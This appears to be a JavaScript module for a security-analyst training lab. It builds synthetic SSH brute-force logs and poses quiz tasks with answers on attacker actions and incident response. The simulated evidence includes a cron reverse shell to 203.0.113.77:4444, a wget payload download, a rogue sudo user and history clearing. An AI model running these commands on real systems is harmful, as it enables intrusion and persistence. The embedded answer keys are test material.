// Lab: SSH brute force that ends in a successful login and persistence.
// Logs are generated deterministically so the terminal answers never drift.

const pad = (n) => String(n).padStart(2, '0')
const t = (s) => `${pad(Math.floor(s / 3600))}:${pad(Math.floor((s % 3600) / 60))}:${pad(s % 60)}`

function authLog() {
  const out = []
  let pid = 2100
  const line = (sec, msg) => out.push(`Nov  4 ${t(sec)} web-prod-02 ${msg}`)
  // Normal admin activity before the attack
  line(6 * 3600 + 2, `sshd[${pid++}]: Accepted publickey for deploy from 10.20.0.15 port 50112 ssh2: RSA SHA256:q8V1xk0nG4`)
  line(6 * 3600 + 3, `sshd[${pid - 1}]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)`)
  line(6 * 3600 + 410, `sshd[${pid - 1}]: pam_unix(sshd:session): session closed for user deploy`)
  // Low-and-slow noise from a scanner
  for (let i = 0; i < 6; i++) line(7 * 3600 + i * 600, `sshd[${pid++}]: Invalid user ${['test', 'oracle', 'pi', 'ubuntu', 'ftp', 'guest'][i]} from 198.51.100.23 port ${41000 + i * 7}`)
  // The brute force: 42 failures against two accounts, then success on svc_backup
  let s = 9 * 3600 + 14 * 60
  const users = ['root', 'root', 'admin', 'svc_backup']
  for (let i = 0; i < 42; i++) {
    const u = users[i % 4]
    const invalid = u === 'admin'
    line(s, `sshd[${pid++}]: Failed password for ${invalid ? 'invalid user ' : ''}${u} from 203.0.113.77 port ${52000 + i * 3} ssh2`)
    s += 2 + (i % 3)
  }
  line(s + 4, `sshd[${pid}]: Accepted password for svc_backup from 203.0.113.77 port 52190 ssh2`)
  line(s + 4, `sshd[${pid}]: pam_unix(sshd:session): session opened for user svc_backup(uid=1003) by (uid=0)`)
  line(s + 61, `sudo:  svc_backup : TTY=pts/1 ; PWD=/home/svc_backup ; USER=root ; COMMAND=/usr/bin/crontab -e`)
  line(s + 95, `sudo:  svc_backup : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash -G sudo sysupdate`)
  line(s + 140, `sshd[${pid}]: pam_unix(sshd:session): session closed for user svc_backup`)
  // Normal again
  line(11 * 3600 + 5, `sshd[${pid + 7}]: Accepted publickey for deploy from 10.20.0.15 port 50980 ssh2: RSA SHA256:q8V1xk0nG4`)
  line(11 * 3600 + 9, `sshd[${pid + 9}]: Failed password for deploy from 10.20.0.15 port 50982 ssh2`)
  return `${out.join('\n')}\n`
}

const bashHistory = `cd /tmp
wget http://203.0.113.77/u.sh
chmod +x u.sh
ls -la
cat /etc/passwd | grep -v nologin
sudo crontab -e
cat /etc/crontab
sudo useradd -m -s /bin/bash -G sudo sysupdate
echo 'c3lzdXBkYXRlOlN1bW1lcjIwMjYh' | base64 -d
history -c
`

const rootCron = `# m h dom mon dow command
0 3 * * * /usr/local/bin/backup.sh
*/10 * * * * /bin/bash -c 'bash -i >& /dev/tcp/203.0.113.77/4444 0>&1'
`

export default {
  id: 'ssh-bruteforce',
  title: 'SSH brute force on a web server',
  objectives: ['1.2', '1.3', '3.3'],
  difficulty: 'Core',
  minutes: 15,
  scenario: 'The SIEM raised "Multiple failed SSH logins followed by success" on web-prod-02, an internet-facing Linux web server. You have a shell on a forensic copy of its logs. Work out what happened, how the attacker kept access, and what to do first.',
  files: {
    '/var/log/auth.log': authLog(),
    '/home/svc_backup/.bash_history': bashHistory,
    '/var/spool/cron/crontabs/root': rootCron,
  },
  artifacts: [
    { id: 'auth', title: 'auth.log', file: '/var/log/auth.log' },
    { id: 'hist', title: '.bash_history (svc_backup)', file: '/home/svc_backup/.bash_history' },
    { id: 'cron', title: 'root crontab', file: '/var/spool/cron/crontabs/root' },
  ],
  hints: [
    'grep "Failed password" /var/log/auth.log | awk \'{print $(NF-3)}\' | sort | uniq -c | sort -rn',
    'grep Accepted /var/log/auth.log',
    'grep -c "Failed password.*203.0.113.77" /var/log/auth.log',
  ],
  tasks: [
    {
      id: 'ip', type: 'input',
      prompt: 'Which source IP address brute-forced SSH and then logged in successfully?',
      answer: '203.0.113.77',
      cmd: 'grep "Accepted password" /var/log/auth.log',
      explain: '203.0.113.77 has dozens of "Failed password" lines followed by "Accepted password for svc_backup". 198.51.100.23 only probed invalid usernames and never got in; 10.20.0.15 is the internal deploy host using a key.',
    },
    {
      id: 'count', type: 'input',
      prompt: 'How many failed password attempts came from that IP?',
      answer: '42',
      cmd: 'grep -c "Failed password.*203.0.113.77" /var/log/auth.log',
      explain: '`grep -c "Failed password.*203.0.113.77" /var/log/auth.log` returns 42. A count like this, in a burst of a few seconds per attempt, is automated guessing.',
    },
    {
      id: 'acct', type: 'input',
      prompt: 'Which account was compromised?',
      answer: ['svc_backup'],
      cmd: 'grep "Accepted password" /var/log/auth.log | grep 203.0.113.77',
      explain: 'The only "Accepted password" from the attacker is for svc_backup. Service accounts with password SSH logins enabled are a classic weak point.',
    },
    {
      id: 'persist', type: 'lines', artifact: 'hist',
      prompt: 'In the attacker\'s .bash_history, select every line that creates persistence or hides their tracks.',
      answer: [5, 7, 9],
      explain: 'Editing root\'s crontab (line 6), adding a new sudo-capable user "sysupdate" (line 8) and `history -c` (line 10) are persistence and anti-forensics. Downloading u.sh is staging, and reading /etc/passwd is discovery.',
    },
    {
      id: 'cronip', type: 'single',
      prompt: 'What does the new entry in root\'s crontab do?',
      options: [
        'Runs the legitimate backup script every 10 minutes',
        'Opens a reverse shell to 203.0.113.77:4444 every 10 minutes',
        'Deletes the auth log every 10 minutes',
        'Downloads u.sh again every 10 minutes',
      ],
      answer: 1,
      explain: '`bash -i >& /dev/tcp/203.0.113.77/4444 0>&1` connects an interactive shell back to the attacker. 4444 is the Metasploit default handler port. Running every 10 minutes means it reconnects even after you kill it.',
    },
    {
      id: 'mitre', type: 'grid',
      prompt: 'Map each attacker action to its MITRE ATT&CK tactic.',
      columns: [{ key: 'tactic', label: 'Tactic', options: ['Credential Access', 'Persistence', 'Defense Evasion', 'Command and Control', 'Discovery'] }],
      rows: [
        { label: '42 rapid SSH password guesses', answer: { tactic: 'Credential Access' } },
        { label: 'useradd -G sudo sysupdate', answer: { tactic: 'Persistence' } },
        { label: 'history -c', answer: { tactic: 'Defense Evasion' } },
        { label: 'Reverse shell to port 4444', answer: { tactic: 'Command and Control' } },
        { label: 'cat /etc/passwd', answer: { tactic: 'Discovery' } },
      ],
      explain: 'Brute force is T1110 (Credential Access). Creating an account is T1136 (Persistence). Clearing history is T1070.003 (Defense Evasion). The reverse shell is the C2 channel. Reading /etc/passwd enumerates accounts (Discovery).',
    },
    {
      id: 'first', type: 'single',
      prompt: 'The server is still online and the cron job is active. What should you do FIRST?',
      options: [
        'Re-image the server from the golden image',
        'Isolate the server from the network (or block 203.0.113.77 and port 4444 outbound) while preserving its state',
        'Delete the sysupdate account and the crontab entry',
        'Email all staff to change their passwords',
      ],
      answer: 1,
      explain: 'Containment comes first and should keep evidence intact: isolate the host so the reverse shell can\'t reconnect. Deleting artifacts or re-imaging now destroys evidence and may miss other persistence. Those belong to eradication and recovery.',
    },
    {
      id: 'order', type: 'order',
      prompt: 'Put the remaining response steps in the right order.',
      items: [
        'Capture memory and disk images, record hashes, start chain of custody',
        'Remove the cron entry and the sysupdate account; rotate svc_backup credentials',
        'Disable password authentication for SSH and restrict it to the bastion host',
        'Restore service and monitor for callbacks to 203.0.113.77',
        'Hold a lessons-learned review and update the playbook',
      ],
      explain: 'Preserve evidence, then eradicate (remove persistence, rotate credentials), harden so it can\'t recur, recover with monitoring, and finish with post-incident activity.',
    },
  ],
}
